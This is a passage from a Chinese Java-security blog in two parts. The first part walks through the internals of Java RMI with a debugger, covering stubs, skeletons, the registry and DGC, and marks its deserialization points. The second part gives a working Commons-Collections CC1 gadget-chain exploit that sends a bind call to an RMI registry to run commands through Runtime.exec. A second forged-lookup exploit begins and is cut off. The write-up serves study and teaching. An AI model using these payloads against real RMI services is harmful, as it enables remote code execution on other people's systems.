<p><img src="/posts/fe391cb8/20251220194833170.png" alt="image.png"><br>继续跟进</p>
<p><img src="/posts/fe391cb8/20251220195302518.png" alt="image.png"><br>我们可以看跟进看一这个方法调用了什么</p>
<p><img src="/posts/fe391cb8/20251220195556010.png" alt="image.png"><br>方法返回一个TCPEndpoint, 看看它的构造函数，其实很明了，这个类就是处理网络请求的一个类。</p>
<p><img src="/posts/fe391cb8/20251220200128472.png" alt="image.png"><br>然后我们回到LiveRef的构造方发中，可以看到endpoint（接口），也就是刚刚返回的TCPEndpoint，这里包含了端口和ip。</p>
<p><img src="/posts/fe391cb8/20251220200608512.png" alt="image.png"><br>这里才是真正处理网络请求的东西，前面的几个类其实都是封装，这里重点标记一下这个类（LiveRef）</p>
<p>然后就是在不同的类里调用exportObject<br><img src="/posts/fe391cb8/20251220201228036.png" alt="image.png"><br>这里会创建这个stub（客户端的一个代理），为什么stub这个代理会出现在这里呢？其实是服务端，在发布远程对象的时候创建了这个代理，并将这个代理放到了注册中心，然后客户端从操作中心拿，拿到后，通过这个stub调用服务端的一个代理，最后调用到远程对象。</p>
<p><img src="/posts/fe391cb8/20251220201816478.png" alt="image.png"><br>跟到这里看如何创建这个代理的</p>
<p><img src="/posts/fe391cb8/20251220202130559.png" alt="image.png"><br>这里封装了远程对象</p>
<p><img src="/posts/fe391cb8/20251220202208828.png" alt="image.png"><br>到这边创建一个动态代理</p>
<p><img src="/posts/fe391cb8/20251223111757718.png" alt="image.png"><br>我们接着走到Target，这是一个总的封装类</p>
<p><img src="/posts/fe391cb8/20251223112646007.png" alt="image.png"><br>到这边我们可以看到，服务端的ref（处理网络请求的引用）和stub（客户端代理）的ref是同一个ref，也就是说，客户端和服务端要进行连接通信，用的是同一个东西。</p>
<p><img src="/posts/fe391cb8/20251223113039827.png" alt="image.png"><br>同时，这里Target的id使用的也是LiveRef的id，所以核心就是LiveRef</p>
<p><img src="/posts/fe391cb8/20251223113228641.png" alt="image.png"><br>封装完成之后，对封装的Target进行一个对象的发布，我们看一下它实现了什么逻辑</p>
<p><img src="/posts/fe391cb8/20251223113837254.png" alt="image.png"></p>
<p><img src="/posts/fe391cb8/20251223113900695.png"><br>这边调用了这个1051的TCPTransport，这边会正式的处理网络请求，listen会开启一个端口，跟进。</p>
<p><img src="/posts/fe391cb8/20251223114209791.png" alt="image.png"><br>开启一个新的服务端的Socket服务，等待连接。</p>
<p><img src="/posts/fe391cb8/20251223114446506.png" alt="image.png"><br>开启服务，等待连接之后的逻辑，应该是处理连接之后做什么，这边开启了新的线程来处理连接之后的逻辑<br><img src="/posts/fe391cb8/20251223114645918.png" alt="image.png"><br>注意点：这里开启了新的线程，说明网络请求的线程和代码的线程是独立的。</p>
<p><img src="/posts/fe391cb8/20251223115118275.png" alt="image.png"><br>出了listen之后我们可以看到端口变成了65152，进行了一个端口的随机分配，这里可以往回看一下，具体的一个端口分配。</p>
<p><img src="/posts/fe391cb8/20251223115243983.png" alt="image.png"><br>在创建一个新的Socket服务的时候，端口被分配了随机的值</p>
<p><img src="/posts/fe391cb8/20251223115940759.png" alt="image.png"><br>实际上已经完成发布了，这里会进行一个记录，两个Table是两个map，target是我们刚刚讲的一个总的封装，这里使用put，把这样整个东西，存在系统的一个静态的表里（相当于日志记录）。<br>然后自此发布远程对象的调试就结束了。</p>
<p>来一个小小的总结：<br>其实在分析过程中，虽然步入了很多方法，这些方法实现了各自的功能，但是如果从整体来看，整个的过程其实就是在使用exportObject方法，可以说整个调试的过程，是一个逐渐细化的一个过程，找到到底是哪里真正发布远程对象的一个过程。</p>
<h3 id="2-创建注册中心"><a href="#2-创建注册中心" class="headerlink" title="2.创建注册中心"></a>2.创建注册中心</h3><h4 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h4><p><img src="/posts/fe391cb8/20251223121918293.png" alt="image.png"><br>创建注册中心，跟进后有一个安全检查，我们直接跳了。</p>
<p><img src="/posts/fe391cb8/20251223122033507.png" alt="image.png"><br>跳过之后在进，然后向下调，我们可以来到这里，创建一个LiveRef，并且封装进UnicastServerRef，这里应该很熟悉和我们刚刚发布服务端相同的一个操作。</p>
<p>我们可以回过头来看一下发布远程对象的操作，来巩固一下<br><img src="/posts/fe391cb8/20251223135416327.png" alt="image.png"><br><img src="/posts/fe391cb8/20251223135429620.png" alt="image.png"></p>
<p>这里呢，和发布对象有一个明显的区别就是<br>发布远程对象时，这里传的一个参数是false<br><img src="/posts/fe391cb8/20251223140923856.png" alt="image.png"><br>但是，在创建注册中心时，这里却用了true<br><img src="/posts/fe391cb8/20251223141035451.png" alt="image.png"><br><img src="/posts/fe391cb8/20251223141428120.png" alt="image.png"><br>这里的参数名时permanent，中文意思是永久的，那么就很明显了，我们之前自定义的那个远程对象是临时的远程对象，而现在的这个远程对象是永久的远程对象，这是两者之间的差别。</p>
<p>然后继续向下调就开始创建代理了，这里不同于发布远程对象的地方是，发布远程对象时，是没有stub的（使用动态代理），但是我们现在创建注册中心是有stub的（直接调用creatStub方法）<br><img src="/posts/fe391cb8/20251223142136986.png" alt="image.png"><br>看一下这里的判断，如果有返回true，如果没有返回false<br>至于在哪里呢？<br><img src="/posts/fe391cb8/20251223142616050.png" alt="image.png"><br>可以开全局搜索一下<br>所以这里是可以进入到creatstub这个方法的，（发布远程对象是没有进入到这个方法，调用了一个动态代理）<br><img src="/posts/fe391cb8/20251223143044848.png" alt="image.png"><br>creatStub这个方法向里存了一个ref，发布远程对象时也是一样存了ref<br>总结：其实就是创建Stub的方法不同，一个是使用动态代理，一个是使用creatStub方法。</p>
<p><img src="/posts/fe391cb8/20251223143823783.png" alt="image.png"><br>然后会走到setSkeleton这个方法，Skeleton是服务端的一个代理。</p>
<p><img src="/posts/fe391cb8/20251223143959812.png" alt="image.png"><br>进到这里，在啰嗦一遍哈，服务端与客户端要进行通信，两边都需要一个网络代理，客户端的代理叫做stub，而服务端的代理叫做skeleton。</p>
<p><img src="/posts/fe391cb8/20251223144258019.png" alt="image.png"><br>和刚刚的stub一样是直接创建的，不是使用动态代理。这个skel是一个内部变量</p>
<p><img src="/posts/fe391cb8/20251223144805566.png" alt="image.png"><br>到这里，impl中就会添加一个skel的这样一个变量</p>
<p>在这之后就是全装到Target里，然后发布，记录，我们直接看最后都记录了什么<br><img src="/posts/fe391cb8/20251223150530371.png" alt="image.png"><br>所有创建好的远程对象都会放在objTable里面</p>
<p><img src="/posts/fe391cb8/20251223150844888.png" alt="image.png"><br>这里有三个远程对象，为什么有三个，这里先放一下<br>我们先来看第二个<br><img src="/posts/fe391cb8/20251223150937654.png" alt="image.png"><br>先看DGC（分布式垃圾回收），这不是我们创建的，但是它有，是默认创建的。<br>在看第三个<br><img src="/posts/fe391cb8/20251223151131664.png" alt="image.png"><br>这个是我们之前创建的远程服务的一个远程对象（使用的动态代理）<br><img src="/posts/fe391cb8/20251223151310928.png" alt="image.png"><br>这里面是没有skel的<br><img src="/posts/fe391cb8/20251223151410067.png" alt="image.png"><br><img src="/posts/fe391cb8/20251223151423768.png" alt="image.png"><br>unicastServerRef和stub开启的端口也是一样的<br>然后我们看第一个<br><img src="/posts/fe391cb8/20251223151705074.png" alt="image.png"><br>这里肯定是有一个skel的，然后端口也都是1099，就不看了。</p>
<h4 id="绑定的流程"><a href="#绑定的流程" class="headerlink" title="绑定的流程"></a>绑定的流程</h4><p><img src="/posts/fe391cb8/20251223152204152.png" alt="image.png"><br>检查是在本地绑定的<br><img src="/posts/fe391cb8/20251223152306009.png" alt="image.png"><br>其实就是一个hashtable，把远程对象put进去，name就是自己取的名字<br>服务端的整体过程：创建远程对象，创建注册中心，绑定。</p>
<h3 id="3-客户端请求注册中心-客户端"><a href="#3-客户端请求注册中心-客户端" class="headerlink" title="3.客户端请求注册中心-客户端"></a>3.客户端请求注册中心-客户端</h3><p>客户端做的两件事：1.从注册中心获取远程对象的代理，2.通过远程代理对服务端进行远程调用<br><img src="/posts/fe391cb8/20251225144424512.png" alt="image.png"><br>在印象中可能会觉得获取远程对象是通过序列化和反序列化，但是实际上这里是进行了一个创建，然后注册中心只要给参数就可以了。然后就是创建了一个liveRef，封装了一下。</p>
<p><img src="/posts/fe391cb8/20251225150326847.png" alt="image.png"><br>这里创建一个代理，然后继续向下调一下</p>
<p><img src="/posts/fe391cb8/20251225150530959.png" alt="image.png"><br>调出来之后，我们看这里的liveRef，这里就获取了注册中心的stub对象。</p>
<p>下一步就开始获取远程对象<br><img src="/posts/fe391cb8/20251225151019909.png" alt="image.png"><br>这里把名字给过去，然后去获取远程对象的代理。（在注册中心上）<br><img src="/posts/fe391cb8/20251225151636208.png" alt="image.png"><br>这边就走不到想要走的地方，也就是lookup方法上，调试不了（这里是版本有点bug），只能去看class文件了。<br><img src="/posts/fe391cb8/20251225152133022.png" alt="image.png"><br>创建一个连接</p>
<p><img src="/posts/fe391cb8/20251225152246913.png" alt="image.png"><br>1的位置传入一个字符串（这个字符串就是我们查找的名称），2的位置将这个字符串序列化，客户端这边又一个序列化，那么到注册中心那里肯定就又一个反序列化了（待会会分析）。<br><img src="/posts/fe391cb8/20251225152618006.png" alt="image.png"><br>然后会调用到invoke（一个激活的方法），在invoke里会调用到executeCall方法<br><img src="/posts/fe391cb8/20251225152748253.png" alt="image.png"></p>
<p><img src="/posts/fe391cb8/20251225152811495.png" alt="image.png"><br>他这个方法是客户端真正处理网络请求的方法。</p>
<p>在接着还是回到之前的那个类里<br><img src="/posts/fe391cb8/20251225153043506.png" alt="image.png"><br>进行网络连接之后，这边获取到了返回值，然后进行了一个反序列化。这里的var23就是传回来的远程对象的动态代理。所以客户端想注册中心获取远程对象的代理是通过序列化和反序列化来实现的。这时，如果有一个恶意的注册中心，就可以使用这个点来对客户端进行攻击（这是第一个点）。</p>
<p>来调一下executeCall这个方法。<br><img src="/posts/fe391cb8/20251225153904678.png" alt="image.png"><br>在这个函数里面有一个处理异常的方法，这里会进行一个反序列化。如果是一个异常类，这里会通过反序列化获取一个具体的信息。所以，如果注册中心返回了一个恶意的流，到客户端这里会被反序列化（第二点，这里更隐蔽，更容易被利用，因为所有的stub里，调用网络请求都会调用到这个方法）。也就是说这第二点中，如果RegistryImpl_Stub这个类里的方法被调用，然后这个方法又调用到了invoke，就有可能调用到readObject，从而被反序列化。<br>小总结：这里主要是客户端连接注册中心，首先，客户端拿stub对象，这里不是通过序列化和反序列化，而是通过客户端的创建，注册中心的传参完成，然后就是客户端获取服务端的远程对象，这里是通过序列化和反序列化进行完成的（漏洞点）。</p>
<h3 id="4-客户端请求服务端-客户端"><a href="#4-客户端请求服务端-客户端" class="headerlink" title="4.客户端请求服务端-客户端"></a>4.客户端请求服务端-客户端</h3><p><img src="/posts/fe391cb8/20251225155406897.png" alt="image.png"><br>remoteOBJ是一个动态代理，动态代理无论你调用什么方法，都会走到你调用处理器的invoke方法<br><img src="/posts/fe391cb8/20251225155520979.png" alt="image.png"><br>走到这边。<br><img src="/posts/fe391cb8/20251225155623620.png" alt="image.png"><br>进入这个方法里，在去看invoke方法的逻辑<br><img src="/posts/fe391cb8/20251225155816069.png" alt="image.png"><br>调到这里，这里的marshalValue方法会序列化一个字符串<br><img src="/posts/fe391cb8/20251225160734098.png" alt="image.png"><br>这里实际上次就是这个参数<br><img src="/posts/fe391cb8/20251225160832891.png" alt="image.png"><br>然后这里又调用了executeCall方法，所有客户端的，如果要处理网络请求都要走这个方法。（一样，这里就有可能被攻击）（调用了jrmp协议进行攻击）<br><img src="/posts/fe391cb8/20251225161644293.png" alt="image.png"><br>到这边会判断有没有返回值然后调用unmarshalValue，这里我们是有返回值的调用到unmarshalValue，然后跟一下他<br><img src="/posts/fe391cb8/20251225165043839.png" alt="image.png"><br>服务端会传来一个序列化的值，客户端通过反序列化来获取。<br>小总结：还是有两个漏洞点，第一个是调用到了executeCall进行攻击，也就是使用jrmp协议进行攻击，第二个就是在服务端返回参数时进行的反序列化攻击。</p>
<h3 id="5-客户端请求注册中心-注册中心"><a href="#5-客户端请求注册中心-注册中心" class="headerlink" title="5.客户端请求注册中心-注册中心"></a>5.客户端请求注册中心-注册中心</h3><p>要开始分析注册中心了，那么就要考虑怎么调试，怎么下断点呢，先回到刚开始给的图中<br><img src="/posts/fe391cb8/1766049177536-8b56d229-cf63-4537-ae9e-c5c47ad6e944.png"><br>我们刚才在对客户端的分析当中，使用的都是stub，而现在我们要操作服务端，所以要使用skel，skel是封装进target了，所以这边断点要下在target了。<br><img src="/posts/fe391cb8/20251225181553119.png" alt="image.png"><br>一步步细化找到target的位置，然后打下断电，从这里开始分析。<br>我们直接开服务端，然后客户端发送请求就断在我们要断的位置了。<br>在这里我们来看一下target里是什么<br><img src="/posts/fe391cb8/20251225182641420.png" alt="image.png"><br>首先是我们创建的stub，然后在disp里也有skel<br><img src="/posts/fe391cb8/20251225182732652.png" alt="image.png"><br>那么接下来我们就跟disp<br><img src="/posts/fe391cb8/20251225182854005.png" alt="image.png"><br>这边调用了dispatch方法<br><img src="/posts/fe391cb8/20251225182947490.png" alt="image.png"><br>到oldDispatch，还是跟着skel走<br><img src="/posts/fe391cb8/20251225183052971.png" alt="image.png"><br>调用了skel的dispatch方法，这里和客户端一样调试不了，所以只能静态的去看一下源码逻辑。<br>注意点：注册中心是一个特殊的服务端<br>进入skel的dispatch方法，我们可以看到有许多的case，不同的case值对应不同的方法<br>0-&gt;bind<br>1-&gt;list<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind<br>这边我们调用的是case2，可以回过去看一下参数<br>然后这里<br><img src="/posts/fe391cb8/20251225184010343.png" alt="image.png"><br>会调用一个反序列化，我们在分析客户端的时候说到客户端会向注册中心传送一个序列化的对象（远程对象的名称）以此获取远程对象，那么注册中心这边的接受肯定就是一个反序列化喽。<br>从0-4的case值中如果有readObject方法的，都是可以被用来攻击的。</p>
<p><img src="/posts/fe391cb8/20251225184413759.png" alt="image.png"><br><img src="/posts/fe391cb8/20251225184434169.png" alt="image.png"><br><img src="/posts/fe391cb8/20251225184443559.png" alt="image.png"><br><img src="/posts/fe391cb8/20251225184455108.png" alt="image.png"></p>
<h3 id="6-客户端请求服务端-服务端"><a href="#6-客户端请求服务端-服务端" class="headerlink" title="6.客户端请求服务端-服务端"></a>6.客户端请求服务端-服务端</h3><p>还是接着上面的看去找发布远程对象时创建的target<br><img src="/posts/fe391cb8/20251225184923893.png" alt="image.png"><br>这时服务端创建的stub是一个动态代理<br><img src="/posts/fe391cb8/20251225185042448.png" alt="image.png"><br>依旧dispatch<br><img src="/posts/fe391cb8/20251225185132962.png" alt="image.png"><br>但是这里的skel是空的<br><img src="/posts/fe391cb8/20251225185212017.png" alt="image.png"><br>获取到输入流<br><img src="/posts/fe391cb8/20251225185247778.png" alt="image.png"><br>获取到了method，也就是我们要调用到的远程方法<br><img src="/posts/fe391cb8/20251225185348337.png" alt="image.png"><br><img src="/posts/fe391cb8/20251225185545372.png" alt="image.png"></p>
<p>然后这里会调用到unmarshalValue，分析客户端的时候会将参数值序列化传入进去，所以服务端就会，反序列化来获取这个参数值<br><img src="/posts/fe391cb8/20251225185736624.png" alt="image.png"><br><img src="/posts/fe391cb8/20251225185815604.png" alt="image.png"><br>这里进行真正的远程调用<br><img src="/posts/fe391cb8/20251225185929124.png" alt="image.png"><br>这边是返回值的序列化，然后传到客户端进行反序列化。<br>小总结：客户端序列化参数传给服务端，服务端反序列化获得参数值。执行完结果之后，服务端序列化返回值传给客户端，客户端在反序列化获得返回值。客户端比服务端这里多了一个jrmp协议攻击。</p>
<h3 id="DGC的stub"><a href="#DGC的stub" class="headerlink" title="DGC的stub"></a>DGC的stub</h3><p>DGC应该也很熟悉吧，这是前面提到的分布式垃圾回收。<br>所以我们先&#x3D;现在要分析一下怎么创建出来<br><img src="/posts/fe391cb8/20251226153329156.png" alt="image.png"><br>实际上开始是从这里，这里的dgcLog是一个静态变量，当调用一个静态变量是会完成一个类的初始化。初始化的时候实际上会调用它的静态代码块。<br><img src="/posts/fe391cb8/20251226153635181.png" alt="image.png"><br>所以他就会走到这边。断在这里，我们重新调试一下。<br><img src="/posts/fe391cb8/20251226153857381.png" alt="image.png"><br>在向下调试就会进入这里，和之前创建注册中心的stub时是一样的<br><img src="/posts/fe391cb8/20251226154005480.png" alt="image.png"><br><img src="/posts/fe391cb8/20251226154100679.png" alt="image.png"><br>从这边就可以看到判断完成后进行一个实例化。<br><img src="/posts/fe391cb8/20251226154232644.png" alt="image.png"><br>DGC也会开启一个服务，注册中心是远程注册的服务，这里DGC是一个远程的回收的服务，他也开放了端口号，但是不像注册中心，他的端口号是随机的。<br><img src="/posts/fe391cb8/20251226154455579.png" alt="image.png"><br>最后就给put进表里<br>这就是DGC的创建过程，他的调用过程也是进入到dispatch方法，和服务端的类似，这里我们就不看了，我们主要分析一下，DGCImpl_Stub和DGCImpl_Skel<br>先看DGCImpl_stub他里面有clean和dirty两个方法一个弱的清除一个强的清除吧。<br><img src="/posts/fe391cb8/20251226155034744.png" alt="image.png"><br>我们会看到dirty方法里会调用到invoke方法<img src="/posts/fe391cb8/20251226155117050.png" alt="image.png"><br>clean中也有，这里就会被jrmp攻击<br><img src="/posts/fe391cb8/20251226155210646.png" alt="image.png"><br>这边也有一个反序列化的点，从服务端获取到一个东西，进行反序列化。<br>然后在看一下DGCImpl_skel<br>有两个case<br><img src="/posts/fe391cb8/20251226155421641.png" alt="image.png"></p>
<p><img src="/posts/fe391cb8/20251226155433201.png" alt="image.png"><br>也都存在反序列化的点<br>小总结：DGC和注册中心差不多，它的客户端和服务端也都会被攻击。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
<li>服务端创建远程对象，发布远程对象，并留下记录，在这个过程中服务端会创建stub。</li>
<li>注册中心被创建(创建skel和stub)，并监听1099端口。</li>
<li>服务端把第一步生成的Stub（远程对象），通过网络发给注册中心。注册中心通过自己的skel接受请求。（bind）</li>
<li>客户端请求注册中心，在此期间会获得注册中心的stub（通过传参获得和反序列化无关），建立连接，并通过传入name（和序列化有关）获取远程对象，也就拿到服务端创建的stub。</li>
<li>客户端利用这个远程对象和服务端建立通信，这时候客户端使用的是服务端创建的stub，服务端使用的是自己的skel进行连接。完成函数的调用。（仅个人理解）</li>
</ol>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>RMI</category>
      </categories>
  </entry>
  <entry>
    <title>RMI_2</title>
    <url>/posts/67304d02/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一个专题,我们对RMI的基础和通信原理进行了简单的分析,这一期对攻击方法进行一个总结<br>参考:<a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#0x03-%E5%B0%8F%E7%BB%93">Java反序列化之RMI专题02-RMI的几种攻击方式 | Drunkbaby’s Blog</a><br><a href="https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#CYWBr">RMI攻击方式 | CurlySean’s Blog</a></p>
<h1 id="RMI的基本攻击方式"><a href="#RMI的基本攻击方式" class="headerlink" title="RMI的基本攻击方式"></a>RMI的基本攻击方式</h1><ul>
<li>RMI Client 打 RMI Registry</li>
<li>RMI Client 打 RMI Server</li>
<li>RMI Client</li>
</ul>
<h2 id="攻击RMI-registry"><a href="#攻击RMI-registry" class="headerlink" title="攻击RMI registry"></a>攻击RMI registry</h2><p>只能够通过客户端打registry.<br>根据上篇文章的分析,我们要去找一下反序列的点位在哪里<br>我们在使用一下语句时,会调用了lookup</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRemoteOBJ remoteOBJ = (IRemoteOBJ) registry.lookup(&quot;rmiserver&quot;);</span><br></pre></td></tr></table></figure>
<p>而这个lookup这里对应着注册中心(特殊的服务端的skel),这时就会调用到<br><img src="/posts/67304d02/20251231142806963.png" alt="image.png"><br>case2,这都是我们之前分析过的,所以不同的方法对应着不同的case<br>0-&gt;bind<br>1-&gt;list<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind<br>那么,我们就可以通过这里不同的方法去调用到不同的case里的readObject方法</p>
<h3 id="使用list方法交互"><a href="#使用list方法交互" class="headerlink" title="使用list方法交互"></a>使用list方法交互</h3><p><img src="/posts/67304d02/20251231143327934.png" alt="image.png"><br>list这里无反序列化的点,就不浪费时间了.</p>
<h3 id="使用bind或rebind进行交互"><a href="#使用bind或rebind进行交互" class="headerlink" title="使用bind或rebind进行交互"></a>使用bind或rebind进行交互</h3><p>先看源码<br><img src="/posts/67304d02/20251231143513391.png" alt="image.png"><br><img src="/posts/67304d02/20251231143544574.png" alt="image.png"><br>都是可以进行反序列化的<br>这里进行反序列化的是远程对象和传来的字符串(name),所以如果是存在cc的依赖的话,我们在这里就可以打一个cc链的漏洞,来进行命令执行<br>依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;    </span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;    </span><br><span class="line"> 	&lt;dependency&gt;    </span><br><span class="line"> 	&lt;groupId&gt;commons-collections&lt;/groupId&gt;    </span><br><span class="line">	 &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    </span><br><span class="line">	 &lt;version&gt;3.2.1&lt;/version&gt;    </span><br><span class="line"> &lt;/dependency&gt;&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>远程对象在两者间传递的时候,传递的是一个Proxy的动态代理对象,而在使用bind的方法时需要的是remote类型的对象,所以我们需要一个能实现remote接口的动态代理类<br>这时我们可以使用<br>这个newProxyInstance方法创建代理类,需要<code>InvocationHandler</code>示例，所以我们需要将恶意类转为<code>InvocationHandler</code>类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@CallerSensitive  </span><br><span class="line">    public static Object newProxyInstance(ClassLoader loader,  </span><br><span class="line">                                          Class&lt;?&gt;[] interfaces,  </span><br><span class="line">                                          InvocationHandler h)  </span><br><span class="line">        throws IllegalArgumentException  </span><br><span class="line">    &#123;  </span><br><span class="line">        ......  </span><br><span class="line">        try &#123;  </span><br><span class="line">            if (sm != null) &#123;  </span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);  </span><br><span class="line">            final InvocationHandler ih = h;  </span><br><span class="line">            if (!Modifier.isPublic(cl.getModifiers())) &#123;  </span><br><span class="line">                AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;  </span><br><span class="line">                    public Void run() &#123;  </span><br><span class="line">                        cons.setAccessible(true);  </span><br><span class="line">                        return null;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            return cons.newInstance(new Object[]&#123;h&#125;);  </span><br><span class="line">        &#125; ......  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javafx.scene.transform.Transform;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">import sun.util.resources.cldr.st.CalendarData_st_LS;  </span><br><span class="line">  </span><br><span class="line">import java.io.*;  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationHandler;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.lang.reflect.Proxy;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">import static java.lang.reflect.Proxy.newProxyInstance;  </span><br><span class="line">  </span><br><span class="line">public class RemoteBind &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);  </span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) CC1();  </span><br><span class="line">        Remote remote = Remote.class.cast(newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));  </span><br><span class="line">        registry.bind(&quot;rmiserver&quot;,remote);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static Object CC1() throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">            Class c = Runtime.class;  </span><br><span class="line">  </span><br><span class="line">//        Method invokerTransformer = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);  </span><br><span class="line">//        Runtime r= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(invokerTransformer);  </span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);  </span><br><span class="line">  </span><br><span class="line">            Transformer[] t =  new Transformer[]&#123;  </span><br><span class="line">                    new ConstantTransformer(c),  </span><br><span class="line">                    new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">            &#125;;  </span><br><span class="line">            ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">            HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">            map.put(&quot;value&quot;,&quot;value&quot;);  </span><br><span class="line">            Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">            Class cc = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">            Constructor declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">            declaredConstructor.setAccessible(true);  </span><br><span class="line">            Object o = declaredConstructor.newInstance(Target.class,decorate);  </span><br><span class="line">  </span><br><span class="line">            return o;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">//        Method m = c.getDeclaredMethod(&quot;getRuntime&quot;,null);  </span><br><span class="line">//        m.setAccessible(true);  </span><br><span class="line">//        Runtime o = (Runtime) m.invoke(null,null);  </span><br><span class="line">//        o.exec(&quot;calc&quot;);  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&#96;&#96;<br><code>Remote remote = Remote.class.cast(newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</code> &#x2F;&#x2F;这行代码的核心作用是利用 Java 反射机制创建一个动态代理对象，并将其强制转换为 Remote 接口类型<br>使用rebind的话改一下方法就可以了<br><img src="/posts/67304d02/20251231152353726.png" alt="image.png"></p>
<h3 id="使用unbind和uplook进行交互"><a href="#使用unbind和uplook进行交互" class="headerlink" title="使用unbind和uplook进行交互"></a>使用unbind和uplook进行交互</h3><p><img src="/posts/67304d02/20251231152555425.png" alt="image.png"><br><img src="/posts/67304d02/20251231152605962.png" alt="image.png"><br>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求，使其可以传入对象<br>也就是进行一个可以传入对象的lookup请求<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">import sun.rmi.server.UnicastRef;  </span><br><span class="line">  </span><br><span class="line">import java.io.ObjectOutput;  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.*;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.rmi.server.RemoteCall;  </span><br><span class="line">import java.rmi.server.RemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteBind &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        // 1. 获取 Registry        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);  </span><br><span class="line">  